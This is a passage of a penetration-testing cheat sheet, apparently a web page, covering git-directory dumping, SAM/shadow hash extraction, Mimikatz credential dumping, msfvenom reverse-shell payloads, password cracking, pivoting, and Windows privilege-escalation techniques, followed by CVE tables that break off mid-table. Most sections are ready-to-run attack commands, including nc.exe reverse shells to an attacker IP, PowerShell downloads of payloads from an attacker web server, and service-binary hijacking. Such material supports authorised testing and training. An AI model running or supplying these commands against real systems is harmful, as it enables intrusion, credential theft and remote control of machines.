<h3 id="download-git">Download .git</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkdir &lt;DESTINATION_FOLDER&gt;
./gitdumper.sh &lt;URL&gt;/.git/ &lt;DESTINATION_FOLDER&gt;
</code></pre></div></div>

<h3 id="extract-git-content">Extract .git content</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkdir &lt;EXTRACT_FOLDER&gt;
./extractor.sh &lt;DESTINATION_FOLDER&gt; &lt;EXTRACT_FOLDER&gt;
</code></pre></div></div>

<hr />

<h2 id="hashes">HASHES</h2>

<h3 id="windows-2">Windows</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg save HKLM\SAM c:\SAM
reg save HKLM\System c:\System

samdump2 System SAM &gt; hashes
</code></pre></div></div>

<h3 id="linux-2">Linux</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unshadow passwd shadow &gt; hashes
</code></pre></div></div>

<hr />

<h2 id="mimikatz">MIMIKATZ</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>privilege::debug
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sekurlsa::logonpasswords
sekurlsa::tickets /export

kerberos::list /export

vault::cred
vault::list

lsadump::sam
lsadump::secrets
lsadump::cache
</code></pre></div></div>

<hr />

<h2 id="miscellaneous">MISCELLANEOUS</h2>

<h3 id="get-a-windows-path-without-spaces">Get a Windows path without spaces</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># path.cmd
@echo off
echo %~s1

path.cmd "C:\Program Files (x86)\Common Files\test.txt"
C:\PROGRA~2\COMMON~1\test.txt -&gt; Valid path without spaces
</code></pre></div></div>

<hr />

<h2 id="msfvenom-payload">MSFVENOM PAYLOAD</h2>

<h3 id="linux-3">Linux</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; shell.elf
</code></pre></div></div>

<h3 id="windows-3">Windows</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell.exe
</code></pre></div></div>

<h3 id="php">PHP</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p php/reverse_php LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.php

Then we need to add the &lt;?php at the first line of the file so that it will execute as a PHP webpage
cat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php
</code></pre></div></div>

<h3 id="asp">ASP</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f asp &gt; shell.asp
</code></pre></div></div>

<h3 id="jsp">JSP</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.jsp
</code></pre></div></div>

<h3 id="war">WAR</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f war &gt; shell.war
</code></pre></div></div>

<h3 id="python">Python</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p cmd/unix/reverse_python LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.py
</code></pre></div></div>

<h3 id="bash">Bash</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p cmd/unix/reverse_bash LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.sh
</code></pre></div></div>

<h3 id="perl">Perl</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p cmd/unix/reverse_perl LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.pl
</code></pre></div></div>

<h3 id="listener">Listener</h3>

<h4 id="metasploit">Metasploit</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/handler
set PAYLOAD &lt;PAYLOAD&gt;
set LHOST &lt;LHOST&gt;
set LPORT &lt;LPORT&gt;
set ExitOnSession false
exploit -j -z
</code></pre></div></div>

<h4 id="netcat">Netcat</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lvp &lt;PORT&gt;
</code></pre></div></div>

<hr />

<h2 id="password-cracking">PASSWORD CRACKING</h2>

<h3 id="online">Online</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Decrypt MD5, SHA1, MySQL, NTLM, SHA256, SHA512 hashes
https://hashes.com/en/decrypt/hash
</code></pre></div></div>

<h3 id="hashcat">Hashcat</h3>

<h4 id="linux-password">Linux password</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat -m 1800 -a 0 hash.txt rockyou.txt
hashcat -m 1800 -a 0 hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule
</code></pre></div></div>

<h4 id="windows-password">Windows password</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat -m 1000 -a 0 hash.txt rockyou.txt
hashcat -m 1000 -a 0 hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule
</code></pre></div></div>

<h4 id="others">Others</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat --example-hashes | grep -i '&lt;BEGINNING_OF_HASH&gt;'
</code></pre></div></div>

<h4 id="rules">Rules</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/NotSoSecure/password_cracking_rules
</code></pre></div></div>

<h3 id="john">John</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john --wordlist=&lt;PASSWORDS_LIST&gt; hash.txt
</code></pre></div></div>

<hr />

<h2 id="pivoting">PIVOTING</h2>

<h3 id="sshuttle">Sshuttle</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sshuttle &lt;USER&gt;@&lt;IP&gt; &lt;IP_OF_THE_INTERFACE&gt;/CIDR
</code></pre></div></div>

<h3 id="proxychains">Proxychains</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -f -N -D 9050 &lt;USER&gt;@&lt;IP&gt;
proxychains &lt;COMMAND&gt;
</code></pre></div></div>

<h3 id="interesting-link">Interesting link</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://artkond.com/2017/03/23/pivoting-guide/
</code></pre></div></div>

<hr />

<h2 id="privile-escalation">PRIVILE ESCALATION</h2>

<h3 id="linux-4">Linux</h3>

<h4 id="enumeration-scripts">Enumeration scripts</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash LinEnum.sh
bash lse.sh -l 1
bash linpeas.sh
python linuxprivchecker.py
./unix-privesc-check standard
</code></pre></div></div>

<h4 id="vulnerability-scan">Vulnerability scan</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl les2.pl
bash les.sh
</code></pre></div></div>

<h4 id="suid-checker">Suid checker</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python suid3num.py

https://gtfobins.github.io/
</code></pre></div></div>

<h4 id="methodology-to-follow">Methodology to follow</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://guif.re/linuxeop
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -l
Kernel Exploits
OS Exploits
Password reuse (mysql, .bash_history, 000- default.conf...)
Known binaries with suid flag and interactive (nmap)
Custom binaries with suid flag either using other binaries or with command execution
Writable files owned by root that get executed (cronjobs)
MySQL as root
Vulnerable services (chkrootkit, logrotate)
Writable /etc/passwd
Readable .bash_history
SSH private key
Listening ports on localhost
/etc/fstab
/etc/exports
/var/mail
Process as other user (root) executing something you have permissions to modify
SSH public key + Predictable PRNG
apt update hooking (PreInvoke)
</code></pre></div></div>

<h3 id="windows-4">Windows</h3>

<h4 id="enumeration-scripts-1">Enumeration scripts</h4>

<h5 id="general-scans">General scans</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winPEAS.exe
windows-privesc-check2.exe
Seatbelt.exe -group=all
powershell -exec bypass -command "&amp; { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
Powerless.bat
winPEAS.bat
</code></pre></div></div>

<h5 id="search-for-cve">Search for CVE</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>systeminfo &gt; systeminfo.txt
python windows-exploit-suggester.py --update
python windows-exploit-suggester.py --database &lt;DATE&gt;-mssb.xlsx --systeminfo systeminfo.txt

systeminfo &gt; systeminfo.txt
wmic qfe &gt; qfe.txt
python wes.py -u
python wes.py systeminfo.txt qfe.txt

powershell -exec bypass -command "&amp; { Import-Module .\Sherlock.ps1; Find-AllVulns; }"
</code></pre></div></div>

<h5 id="post-exploitation">Post exploitation</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lazagne.exe all
SharpWeb.exe
mimikatz.exe
</code></pre></div></div>

<h4 id="juicypotato-seimpersonate-or-seassignprimarytoken">JuicyPotato (SeImpersonate or SeAssignPrimaryToken)</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>If the user has SeImpersonate or SeAssignPrimaryToken privileges then you are SYSTEM.

JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe &lt;IP&gt; &lt;PORT&gt; -e c:\windows\system32\cmd.exe" -t *
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe &lt;IP&gt; &lt;PORT&gt; -e c:\windows\system32\cmd.exe" -t * -c &lt;CLSID&gt;

# CLSID
https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
</code></pre></div></div>

<h4 id="methodology-to-follow-1">Methodology to follow</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://guif.re/windowseop
https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
https://mysecurityjournal.blogspot.com/p/client-side-attacks.html
http://www.fuzzysecurity.com/tutorials/16.html
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
</code></pre></div></div>

<h4 id="autorun">Autorun</h4>

<h5 id="detection">Detection</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell -exec bypass -command "&amp; { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"

[*] Checking for modifiable registry autoruns and configs...

Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\My Program
Path           : "C:\Program Files\Autorun Program\program.exe"
ModifiableFile : @{Permissions=System.Object[]; ModifiablePath=C:\Program Files\Autorun Program\program.exe; IdentityReference=Everyone}
</code></pre></div></div>

<p>or</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winPEAS.exe

[+] Autorun Applications(T1010)
    Folder: C:\Program Files\Autorun Program
    File: C:\Program Files\Autorun Program\program.exe
    FilePerms: Everyone [AllAccess]
</code></pre></div></div>

<h5 id="exploitation">Exploitation</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Attacker
msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; program.exe
sudo python -m SimpleHTTPServer 80
sudo nc -lvp &lt;PORT&gt;

# Victim
cd C:\Program Files\Autorun Program\
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://&lt;IP&gt;/program.exe', '.\program.exe')

To execute it with elevated privileges we need to wait for someone in the Admin group to login.
</code></pre></div></div>

<h4 id="alwaysinstallelevated">AlwaysInstallElevated</h4>

<h5 id="detection-1">Detection</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell -exec bypass -command "&amp; { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"

[*] Checking for AlwaysInstallElevated registry key...

AbuseFunction : Write-UserAddMSI
</code></pre></div></div>

<p>or</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer

If both values are equal to 1 then it's vulnerable.
</code></pre></div></div>

<p>or</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winPEAS.exe

[+] Checking AlwaysInstallElevated(T1012)

  AlwaysInstallElevated set to 1 in HKLM!
  AlwaysInstallElevated set to 1 in HKCU!
</code></pre></div></div>

<h5 id="exploitation-1">Exploitation</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Attacker
msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f msi &gt; program.msi
sudo python -m SimpleHTTPServer 80
sudo nc -lvp &lt;PORT&gt;

# Victim
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://&lt;IP&gt;/program.msi', 'C:\Temp\program.msi')
msiexec /quiet /qn /i C:\Temp\program.msi
</code></pre></div></div>

<h4 id="executable-files">Executable Files</h4>

<h5 id="detection-2">Detection</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell -exec bypass -command "&amp; { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"

[*] Checking service executable and argument permissions...

ServiceName                     : filepermsvc
Path                            : "C:\Program Files\File Permissions Service\filepermservice.exe"
ModifiableFile                  : C:\Program Files\File Permissions Service\filepermservice.exe
ModifiableFilePermissions       : {ReadAttributes, ReadControl, Execute/Traverse, DeleteChild...}
ModifiableFileIdentityReference : Everyone
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'filepermsvc'
CanRestart                      : True
</code></pre></div></div>

<p>or</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winPEAS.exe

[+] Interesting Services -non Microsoft-(T1007)

filepermsvc(Apache Software Foundation - File Permissions Service)["C:\Program Files\File Permissions Service\filepermservice.exe"] - Manual - Stopped
	File Permissions: Everyone [AllAccess]
</code></pre></div></div>

<h5 id="exploitation-2">Exploitation</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Attacker
msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; program.exe
sudo python -m SimpleHTTPServer 80
sudo nc -lvp &lt;PORT&gt;

# Victim
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://&lt;IP&gt;/program.exe', 'C:\Temp\program.exe')
copy /y c:\Temp\program.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
sc start filepermsvc
</code></pre></div></div>

<h4 id="startup-applications">Startup applications</h4>

<h5 id="detection-3">Detection</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

C:\&gt;icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup BUILTIN\Users:(F)
                                                             TCM-PC\TCM:(I)(OI)(CI)(DE,DC)
                                                             NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                                                             BUILTIN\Administrators:(I)(OI)(CI)(F)
                                                             BUILTIN\Users:(I)(OI)(CI)(RX)
                                                             Everyone:(I)(OI)(CI)(RX)

If the user you're connecte with has full access ‘(F)’ to the directory (here Users) then it's vulnerable.
</code></pre></div></div>

<h5 id="exploitation-3">Exploitation</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Attacker
msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; program.exe
sudo python -m SimpleHTTPServer 80
sudo nc -lvp &lt;PORT&gt;

# Victim
cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://&lt;IP&gt;/program.exe', '.\program.exe')

To execute it with elevated privileges we need to wait for someone in the Admin group to login.
</code></pre></div></div>

<h4 id="weak-service-permission">Weak service permission</h4>

<h5 id="detection-4">Detection</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Find all services authenticated users have modify access onto
accesschk.exe /accepteula -uwcqv "Authenticated Users" *

if SERVICE_ALL_ACCESS then vulnerable

# Find all weak folder permissions per drive.
accesschk.exe /accepteula -uwdqs Users c:\
accesschk.exe /accepteula -uwdqs "Authenticated Users" c:\

# Find all weak file permissions per drive.
accesschk.exe /accepteula -uwqs Users c:\*.*
accesschk.exe /accepteula -uwqs "Authenticated Users" c:\*.*
</code></pre></div></div>

<p>or</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell -exec bypass -command "&amp; { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"

[*] Checking service permissions...

ServiceName   : daclsvc
Path          : "C:\Program Files\DACL Service\daclservice.exe"
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'daclsvc'
CanRestart    : True
</code></pre></div></div>

<p>or</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winPEAS.exe

[+] Interesting Services -non Microsoft-(T1007)

daclsvc(DACL Service)["C:\Program Files\DACL Service\daclservice.exe"] - Manual - Stopped
	YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles

[+] Modifiable Services(T1007)
	LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
	daclsvc: WriteData/CreateFiles
</code></pre></div></div>

<h5 id="exploitation-4">Exploitation</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Attacker
sudo python -m SimpleHTTPServer 80
sudo nc -lvp &lt;PORT&gt;

# Victim
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://&lt;IP&gt;/nc.exe', '.\nc.exe')
sc config &lt;SERVICENAME&gt; binpath= "&lt;PATH&gt;\nc.exe &lt;IP&gt; &lt;PORT&gt; -e cmd.exe"
sc start &lt;SERVICENAME&gt;
or 
net start &lt;SERVICENAME&gt;
</code></pre></div></div>

<h4 id="unquoted-service-paths">Unquoted service paths</h4>

<h5 id="detection-5">Detection</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell -exec bypass -command "&amp; { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"

[*] Checking for unquoted service paths...

ServiceName    : unquotedsvc
Path           : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
ModifiablePath : @{Permissions=AppendData/AddSubdirectory; ModifiablePath=C:\;IdentityReference=NT AUTHORITY\Authenticated Users}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path &lt;HijackPath&gt;
CanRestart     : True

ServiceName    : unquotedsvc
Path           : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
ModifiablePath : @{Permissions=System.Object[]; ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path &lt;HijackPath&gt;
CanRestart     : True
</code></pre></div></div>

<p>or</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winPEAS.exe

[+] Interesting Services -non Microsoft-(T1007)

unquotedsvc(Unquoted Path Service)[C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe] - Manual - Stopped - No quotes and Space detected
</code></pre></div></div>

<h5 id="exploitation-5">Exploitation</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Attacker
msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; Common.exe
sudo python -m SimpleHTTPServer 80
sudo nc -lvp &lt;PORT&gt;

# Victim
cd "C:\Program Files\Unquoted Path Service\"
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://&lt;IP&gt;/Common.exe', '.\Common.exe')
sc start unquotedsvc
</code></pre></div></div>

<h4 id="hot-potato">Hot potato</h4>

<h5 id="exploitation-6">Exploitation</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Attacker
sudo python -m SimpleHTTPServer 80
sudo nc -lvp &lt;PORT&gt;

# Victim
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://&lt;IP&gt;/nc.exe', '.\nc.exe')
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://&lt;IP&gt;/Tater.ps1.exe', '.\Tater.ps1.exe')
powershell -exec bypass -command "&amp; { Import-Module .\Tater.ps1; Invoke-Tater -Trigger 1 -Command '.\nc.exe &lt;IP&gt; &lt;PORT&gt; -e cmd.exe' }"
</code></pre></div></div>

<h4 id="cve">CVE</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Already compiled exploit
https://github.com/SecWiki/windows-kernel-exploits
https://github.com/abatchy17/WindowsExploits
</code></pre></div></div>

<h5 id="windows-xp">Windows XP</h5>

<table>
  <thead>
    <tr>
      <th style="text-align: center">CVE</th>
      <th style="text-align: left">Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center">CVE-2002-1214</td>
      <td style="text-align: left">ms02_063_pptp_dos - exploits a kernel based overflow when sending abnormal PPTP Control Data packets - code execution, DoS</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2003-0352</td>
      <td style="text-align: left">ms03_026_dcom - exploits a stack buffer overflow in the RPCSS service</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2003-0533</td>
      <td style="text-align: left">MS04-011 - ms04_011_lsass - exploits a stack buffer overflow in the LSASS service</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2003-0719</td>
      <td style="text-align: left">ms04_011_pct - exploits a buffer overflow in the Microsoft Windows SSL PCT protocol stack - Private communication target overflow</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2003-0812</td>
      <td style="text-align: left">ms03_049_netapi - exploits a stack buffer overflow in the NetApi32</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2003-0818</td>
      <td style="text-align: left">ms04_007_killbill -  vulnerability in the bit string decoding code in the Microsoft ASN.1 library</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2003-0822</td>
      <td style="text-align: left">ms03_051_fp30reg_chunked - exploit for the chunked encoding buffer overflow described in MS03-051</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2004-0206</td>
      <td style="text-align: left">ms04_031_netdde - exploits a stack buffer overflow in the NetDDE service</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2010-3138</td>
      <td style="text-align: left">EXPLOIT-DB 14765 - Untrusted search path vulnerability - allows local users to gain privileges via a Trojan horse</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2010-3147</td>
      <td style="text-align: left">EXPLOIT-DB 14745 - Untrusted search path vulnerability in wab.exe - allows local users to gain privileges via a Trojan horse</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2010-3970</td>
      <td style="text-align: left">ms11_006_createsizeddibsection - exploits a stack-based buffer overflow in thumbnails within .MIC files - code execution</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2011-1345</td>
      <td style="text-align: left">Internet Explorer does not properly handle objects in memory - allows remote execution of code via object</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2011-5046</td>
      <td style="text-align: left">EXPLOIT-DB 18275 - GDI in windows does not properly validate user-mode input - allows remote code execution</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2012-4349</td>
      <td style="text-align: left">Unquoted windows search path - Windows provides the capability of including spaces in path names - can be root</td>
    </tr>
  </tbody>
</table>

<h5 id="windows-7">Windows 7</h5>

<table>
  <thead>
    <tr>
      <th style="text-align: center">CVE</th>
      <th style="text-align: left">Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center">CVE-2010-0232</td>
      <td style="text-align: left">ms10_015_kitrap0d - create a new session with SYSTEM privileges via the KiTrap0D exploit</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2010-2568</td>
      <td style="text-align: left">ms10_046_shortcut_icon_dllloader - exploits a vulnerability in the handling of Windows Shortcut files (.LNK) - run a payload</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2010-2744</td>
      <td style="text-align: left">EXPLOIT-DB 15894 - kernel-mode drivers in windows do not properly manage a window class - allows privileges escalation</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2010-3227</td>
      <td style="text-align: left">EXPLOIT-DB - Stack-based buffer overflow in the UpdateFrameTitleForDocument method - arbitrary code execution</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2014-4113</td>
      <td style="text-align: left">ms14_058_track_popup_menu - exploits a NULL Pointer Dereference in win32k.sys - arbitrary code execution</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2014-4114</td>
      <td style="text-align: left">ms14_060_sandworm - exploits a vulnerability found in Windows Object Linking and Embedding - arbitrary code execution</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2015-0016</td>
      <td style="text-align: left">ms15_004_tswbproxy -  abuses a process creation policy in Internet Explorer’s sandbox - code execution</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2018-8494</td>
      <td style="text-align: left">remote code execution vulnerability exists when the Microsoft XML Core Services MSXML parser processes user input</td>
    </tr>
  </tbody>
</table>

<h5 id="windows-8">Windows 8</h5>

<table>
  <thead>
    <tr>
      <th style="text-align: center">CVE</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center">CVE-2013-0008</td>
      <td>ms13_005_hwnd_broadcast - attacker can broadcast commands from lower Integrity Level process to a higher one - privilege escalation</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2013-1300</td>
      <td>ms13_053_schlamperei - kernel pool overflow in Win32k - local privilege escalation</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2013-3660</td>
      <td>ppr_flatten_rec - exploits EPATHOBJ::pprFlattenRec due to the usage of uninitialized data - allows memory corruption</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2013-3918</td>
      <td>ms13_090_cardspacesigninhelper - exploits CardSpaceClaimCollection class from the icardie.dll ActiveX control - code execution</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2013-7331</td>
      <td>ms14_052_xmldom - uses Microsoft XMLDOM object to enumerate a remote machine’s filenames</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2014-6324</td>
      <td>ms14_068_kerberos_checksum - exploits the Microsoft Kerberos implementation - privilege escalation</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2014-6332</td>
      <td>ms14_064_ole_code_execution -  exploits the Windows OLE Automation array vulnerability</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2014-6352</td>
      <td>ms14_064_packager_python - exploits Windows Object Linking and Embedding (OLE) - arbitrary code execution</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2015-0002</td>
      <td>ntapphelpcachecontrol - NtApphelpCacheControl Improper Authorization Check - privilege escalation</td>
    </tr>
  </tbody>
</table>

<h5 id="windows-10">Windows 10</h5>

<table>
  <thead>
    <tr>
      <th style="text-align: center">CVE</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center">CVE-2015-0057</td>
      <td>exploits GUI component of Windows namely the scrollbar element - allows complete control of a Windows machine</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2015-1769</td>
      <td>MS15-085 - Vulnerability in Mount Manager - Could Allow Elevation of Privilege</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2015-2426</td>
      <td>ms15_078_atmfd_bof MS15-078 - exploits a pool based buffer overflow in the atmfd.dll driver</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2015-2479</td>
      <td>MS15-092 - Vulnerabilities in .NET Framework - Allows Elevation of Privilege</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2015-2513</td>
      <td>MS15-098 - Vulnerabilities in Windows Journal - Could Allow Remote Code Execution</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2015-2423</td>
      <td>MS15-088 - Unsafe Command Line Parameter Passing - Could Allow Information Disclosure</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2015-2431</td>
      <td>MS15-080 - Vulnerabilities in Microsoft Graphics Component - Could Allow Remote Code Execution</td>
    </tr>
    <tr>
      <td style="text-align: center">CVE-2015-2441</td>
